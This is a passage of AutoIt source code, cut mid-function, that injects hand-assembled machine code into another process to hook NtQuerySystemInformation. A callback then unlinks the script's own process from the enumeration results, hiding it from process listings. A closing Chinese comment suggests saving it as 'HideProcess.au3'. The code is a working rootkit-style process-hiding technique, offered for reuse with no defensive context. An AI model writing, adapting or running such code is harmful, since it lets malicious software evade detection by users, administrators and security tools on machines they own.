	"B8" & _RTLongPtrToBytes($pSendMessageW) & _	; 29
	"FFD0" & _			; 31
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 0) & StringMid($bJump, 1, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 1) & StringMid($bJump, 3, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 2) & StringMid($bJump, 5, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 3) & StringMid($bJump, 7, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 4) & StringMid($bJump, 9, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 5) & StringMid($bJump, 11, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 6) & StringMid($bJump, 13, 2) & _
	"C605" & _RTLongPtrToBytes($pNtQuerySystemInfo + 7) & StringMid($bJump, 15, 2) & _
	"8BE5" & _			; 2
	"8B5504" & _			; 3
	"5D" & _			; 1
	"83C414" & _			; 3
	"52" & _			; 1
	"A1" & _RTLongPtrToBytes($pCall + 1020) & _ ; 5
	"C3"				; 1


	_RTWriteProcessMemory($hProcess, $pCall, $bCode, BinaryLen($bCode), "binary")
EndFunc	;==>_EnumProcessesCallBack




Func _NotifyProcessEnumeration($hWnd, $iMsg, $iCurPid, $pProcessInfo)
	Local $iPid, $iOffset, $iPrevOffset, $hProcess

	$hProcess = _RTOpenProcess(Number($iCurPid))

	For $i = 1 To 1 Step 0
		$iPid = _RTReadProcessMemory($hProcess, $pProcessInfo + 68, 0, 4, "dword*")
		$iOffset = _RTReadProcessMemory($hProcess, $pProcessInfo, 0, 4, "dword*")

		If ($iPid = @AutoItPid) Then
			If ($iOffset = 0) Then
				_RTWriteProcessMemory($hProcess, $pProcessInfo - $iPrevOffset, 0, 4, "dword*")
			Else
				_RTWriteProcessMemory($hProcess, $pProcessInfo - $iPrevOffset, $iPrevOffset + $iOffset, 4, "dword*")
			EndIf
			ExitLoop
		EndIf
		If ($iOffset = 0) Then ExitLoop

		$pProcessInfo += $iOffset
		$iPrevOffset = $iOffset

	Next
	_RTCloseHandle($hProcess)
EndFunc	;==>_NotifyProcessEnumeration

;------------------------------------------------------------------------------------------------------
;以上代码可以打包成这个 HideProcess.au3 的名字   搜索开始名字   $bProtectFingerprint




















